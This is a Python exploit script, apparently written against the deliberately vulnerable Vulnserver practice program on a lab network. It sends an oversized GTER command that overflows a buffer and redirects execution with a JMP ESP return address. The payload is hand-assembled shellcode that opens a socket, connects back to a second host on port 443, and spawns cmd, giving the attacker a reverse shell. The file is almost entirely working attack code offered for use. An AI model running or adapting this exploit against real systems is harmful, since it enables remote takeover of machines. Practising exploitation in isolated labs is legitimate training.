#!/usr/bin/python
import socket


s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connect=s.connect(('192.168.56.101',9999))

# arwin - win32 address resolution program - by steve hanna - v.01
# CreateProcessA is located at 0x76521c28 in kernel32

# arwin - win32 address resolution program - by steve hanna - v.01
# WSASocketA is located at 0x76ff8fa9 in ws2_32

# arwin - win32 address resolution program - by steve hanna - v.01
# connect is located at 0x76ff40d9 in ws2_32

# PAYLOAD LENGHT IS : 4010 with 4000 of A

buf = 'GTER /.:/'
# [*] Exact match at offset 147
buf += "A"*25
buf += "\x50"   # push eax
buf += "\x5C"   # pop esp
buf += "\x56" # push esi
buf += "\x56" # push esi
buf += "\x56" # push esi
buf += "\x31\xDB" # xor ebx, ebx
buf += "\xB3\x06" # mov bl, 6
buf += "\x53" # push ebx
buf += "\x46" # inc esi
buf += "\x56" # push esi
buf += "\x46" # inc esi
buf += "\x56" # push esi
buf += "\xBB\xA9\x8F\xFF\x76" # mov ebx,0x76ff8fa9 WSASocketA address
buf += "\x31\xC0" # xor eax,eax
buf += "\xFF\xD3" # call ebx
buf += "\x96" # xchg eax,esi
buf += "\x68\xC0\xA8\x38\x66" # push dword 0x6638a8c0 IP : 192.168.56.102
buf += "\x66\x68\x01\xBB"          # push word 0xbb01 Port : 443"
buf += "\x66\x50"              # push ax  ###### SUSPICIOUS
buf += "\x89\xE2"              # mov edx,esp
buf += "\x6A\x10"              # push byte +0x10
buf += "\x52"                # push edx
buf += "\x56" # push esi
buf += "\xBB\xD9\x40\xFF\x76" # mov ebx,0x76ff40d9 connect address
buf += "\xFF\xD3" # call ebx

buf += "\xBA\x63\x63\x6D\x64"    #    mov edx,0x646d6363
buf += "\xC1\xEA\x08"            #    shr edx,byte 0x8
buf += "\x52"                    # push edx
buf += "\x89\xE1"                # mov ecx,esp

buf += "\x31\xD2"                # xor edx,edx
buf += "\x83\xEC\x10"            # sub esp,byte +0x10
buf += "\x89\xE3"                # mov ebx,esp


buf += "\x56" #                push esi
buf += "\x56" #                push esi
buf += "\x56" #                push esi
buf += "\x52" #                push edx
buf += "\x52" #                push edx
buf += "\x31\xC0" #              xor eax,eax
buf += "\x40" #                inc eax
buf += "\xC1\xC0\x08"  #          rol eax,byte 0x8
buf += "\x50" #                push eax
buf += "\x52" #                push edx
buf += "\x52" #                push edx
buf += "\x52" #                push edx
buf += "\x52" #                push edx
buf += "\x52" #                push edx
buf += "\x52" #                push edx
buf += "\x52" #                push edx
buf += "\x52" #                push edx
buf += "\x52" #                push edx
buf += "\x52" #                push edx
buf += "\x31\xC0" #              xor eax,eax
buf += "\x04\x2C" #              add al,0x2c
buf += "\x50" #                push eax
buf += "\x89\xE0" #              mov eax,esp

buf += "\x53" #                push ebx
buf += "\x50" #                push eax
buf += "\x52" #                push edx
buf += "\x52" #                push edx
buf += "\x52" #                push edx
buf += "\x31\xC0" #             xor eax,eax
buf += "\x40" #                inc eax
buf += "\x50" #                push eax
buf += "\x52" #                push edx
buf += "\x52" #                push edx

buf += "\x51" #                push ecx
buf += "\x52" #                push edx

buf += "\xBB\x28\x1C\x52\x76"  #      mov ebx,0x76521c28 call for CreateProcess
buf += "\xFF\xD3" #              call ebx


buf += "D"*(147-25-115)
#buf += "B"*4
# JMP ESP AT : 625011AF

buf += "\xaf\x11\x50\x62"

buf += "\xeb\x80"
buf += "C"*(2000-147-4-2)

print "Fuzzing GTER with %s bytes" % len(buf)
print s.recv(1024)

s.send(buf + '\r\n')

print s.recv(1024)

s.close()
